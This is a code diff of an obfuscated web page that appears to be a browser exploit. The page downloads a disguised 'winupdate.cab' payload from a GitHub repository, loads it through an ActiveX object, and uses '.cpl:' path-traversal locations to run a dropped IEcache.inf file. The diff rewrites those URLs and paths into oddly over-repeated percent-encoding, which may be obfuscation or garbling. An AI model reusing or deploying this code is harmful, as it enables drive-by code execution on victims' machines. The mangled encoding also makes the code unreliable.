@@ -61,7 +61,7 @@ var StringArray = [
 	'ect',
 	'w/IEcache.inf',
 	'522415dmiRUA',
-	'https://github.com/goatsec1/goatsec12/raw/main/winupdate.cab',
+	'https%25252525252525252525252525252525252525252525252525252525253A%25252525252525252525252525252525252525252525252525252525252F%25252525252525252525252525252525252525252525252525252525252Fgithub.com%25252525252525252525252525252525252525252525252525252525252Fgoatsec1%25252525252525252525252525252525252525252525252525252525252Fgoatsec12%25252525252525252525252525252525252525252525252525252525252Fraw%25252525252525252525252525252525252525252525252525252525252Fmain%25252525252525252525252525252525252525252525252525252525252Fwinupdate.cab',
 	'88320wWglcB',
 	'XMLHttpRequest',
 	'IEcache.inf',
@@ -133,11 +133,11 @@ function a0_0x15ec(_0x329dba, _0x46107c) {
     , open = httpReq['prototype']['open']
     , send = httpReq['prototype']['send']
     , timeout = window1['setTimeout'];
-	open['call'](httpReq1, 'GET', 'https://github.com/goatsec1/goatsec12/raw/main/winupdate.cab', ![])
+	open['call'](httpReq1, 'GET', 'https%25252525252525252525252525252525252525252525252525252525253A%25252525252525252525252525252525252525252525252525252525252F%25252525252525252525252525252525252525252525252525252525252Fgithub.com%25252525252525252525252525252525252525252525252525252525252Fgoatsec1%25252525252525252525252525252525252525252525252525252525252Fgoatsec12%25252525252525252525252525252525252525252525252525252525252Fraw%25252525252525252525252525252525252525252525252525252525252Fmain%25252525252525252525252525252525252525252525252525252525252Fwinupdate.cab', ![])
     , send['call'](httpReq1)
     , htmlInstance3['Script']['document']['write']('<body>');
 	var Object1 = createElement['call'](htmlInstance3['Script']['document'], 'object');
-	Object1['setAttribute']('codebase', 'https://github.com/goatsec1/goatsec12/raw/main/winupdate.cab#version=5,0,0,0');
+	Object1['setAttribute']('codebase', 'https%25252525252525252525252525252525252525252525252525252525253A%25252525252525252525252525252525252525252525252525252525252F%25252525252525252525252525252525252525252525252525252525252Fgithub.com%25252525252525252525252525252525252525252525252525252525252Fgoatsec1%25252525252525252525252525252525252525252525252525252525252Fgoatsec12%25252525252525252525252525252525252525252525252525252525252Fraw%25252525252525252525252525252525252525252525252525252525252Fmain%25252525252525252525252525252525252525252525252525252525252Fwinupdate.cab#version=5,0,0,0');
 	Object1['setAttribute']('classid', 'CLSID:edbc374c-5730-432a-b5b8-de94f0b57217')
     , AppendChild['call'](htmlInstance3['Script']['document']['body']
     , Object1)
@@ -150,14 +150,14 @@ function a0_0x15ec(_0x329dba, _0x46107c) {
     , ActiveXObject1['Script']['location'] = '.cpl:123'
     , ActiveXObject1['Script']['location'] = '.cpl:123'
     , ActiveXObject1['Script']['location'] = '.cpl:123'
-    , ActiveXObject1['Script']['location'] = '.cpl:../../../AppData/Local/Temp/Low/IEcache.inf'
-    , ActiveXObject2['Script']['location'] = '.cpl:../../../AppData/Local/Temp/IEcache.inf'
-    , ActiveXObject3['Script']['location'] = '.cpl:../../../../AppData/Local/Temp/Low/IEcache.inf'
-    , ActiveXObject4['Script']['location'] = '.cpl:../../../../AppData/Local/Temp/IEcache.inf'
-    , ActiveXObject5['Script']['location'] = '.cpl:../../../../../Temp/Low/IEcache.inf'
-    , ActiveXObject4['Script']['location'] = '.cpl:../../../../../Temp/IEcache.inf'
-    , ActiveXObject4['Script']['location'] = '.cpl:../../Low/IEcache.inf'
-    , ActiveXObject4['Script']['location'] = '.cpl:../../IEcache.inf';
+    , ActiveXObject1['Script']['location'] = '.cpl:..%252F..%252F..%252FAppData%252FLocal%252FTemp%252FLow%252FIEcache.inf'
+    , ActiveXObject2['Script']['location'] = '.cpl:..%25252F..%25252F..%25252FAppData%25252FLocal%25252FTemp%25252FIEcache.inf'
+    , ActiveXObject3['Script']['location'] = '.cpl:..%25252F..%25252F..%25252F..%25252FAppData%25252FLocal%25252FTemp%25252FLow%25252FIEcache.inf'
+    , ActiveXObject4['Script']['location'] = '.cpl:..%25252F..%25252F..%25252F..%25252FAppData%25252FLocal%25252FTemp%25252FIEcache.inf'
+    , ActiveXObject5['Script']['location'] = '.cpl:..%25252F..%25252F..%25252F..%25252F..%25252FTemp%25252FLow%25252FIEcache.inf'
+    , ActiveXObject4['Script']['location'] = '.cpl:..%25252F..%25252F..%25252F..%25252F..%25252FTemp%25252FIEcache.inf'
+    , ActiveXObject4['Script']['location'] = '.cpl:..%25252F..%25252FLow%25252FIEcache.inf'
+    , ActiveXObject4['Script']['location'] = '.cpl:..%25252F..%25252FIEcache.inf';
 }());
   </script>
  </body>
